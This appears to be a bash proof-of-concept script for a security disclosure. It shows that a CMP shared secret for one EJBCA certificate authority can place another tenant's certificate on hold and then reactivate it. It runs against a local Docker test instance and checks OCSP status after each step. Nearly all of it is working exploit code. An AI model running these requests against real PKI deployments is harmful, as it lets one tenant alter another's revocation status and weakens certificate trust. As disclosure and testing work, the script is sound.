#!/usr/bin/env bash
# E-01 (variant) — Cross-CA reactivation. With ONLY ManagementCA's secret (secretA), place a CA-B
# certificate on certificateHold (reason 6) and then remove it from the CRL (reason 8) — i.e. a
# tenant un-revokes another tenant's certificate. Reactivation is limited to certs on hold.
set -u
C="${EJBCA_CONTAINER:-ejbca}"; WORK="${WORK:-/tmp/ejbca-poc}"; cd "$WORK" || exit 1
J() { docker exec "$C" /opt/keyfactor/bin/ejbca.sh "$@" 2>&1 | grep -viE "cannot find name for user ID"; }
URL="http://127.0.0.1:8080/ejbca/publicweb/cmp/ratest"
MCA="$(cat "$WORK/mca_dn.txt")"
ocsp() { openssl ocsp -issuer cab.pem -cert "$1" -url "http://127.0.0.1:8080/ejbca/publicweb/status/ocsp" -no_nonce 2>/dev/null | grep -oiE "$1: (good|revoked|unknown)"; }
rr() { openssl cmp -cmd rr -server "$URL" -recipient "$MCA" -ref rauser -secret pass:secretA -oldcert "$1" -revreason "$2" -unprotected_errors -verbosity 2 2>&1 | grep -oiE "PKIStatus: [a-z]*|StatusString: \"[^\"]*\"" | head -2; }

echo "### fresh CA-B cert victimB4 ###"
J ra delendentity --username victimB4 --force >/dev/null 2>&1
J ra addendentity --username victimB4 --password foo123 --dn "CN=victimB4,O=Tenant B" --caname CA-B --type 1 --token P12 | grep -i added | head -1
J ra setclearpwd victimB4 foo123 >/dev/null 2>&1; J batch victimB4 >/dev/null 2>&1
docker cp "$C:/opt/keyfactor/p12/victimB4.p12" "$WORK/victimB4.p12" >/dev/null 2>&1
openssl pkcs12 -in victimB4.p12 -clcerts -nokeys -passin pass:foo123 -out victimB4.pem 2>/dev/null
echo "  [0] before:                 $(ocsp victimB4.pem)"
echo "### cross-CA HOLD (reason 6 = certificateHold) with secretA ###"; rr victimB4.pem 6
sleep 1; echo "  [1] after hold:             $(ocsp victimB4.pem)"
echo "### cross-CA REACTIVATE (reason 8 = removeFromCRL) with secretA ###"; rr victimB4.pem 8
sleep 1; echo "  [2] after removeFromCRL:    $(ocsp victimB4.pem)   (good => a tenant un-revoked another CA's cert)"
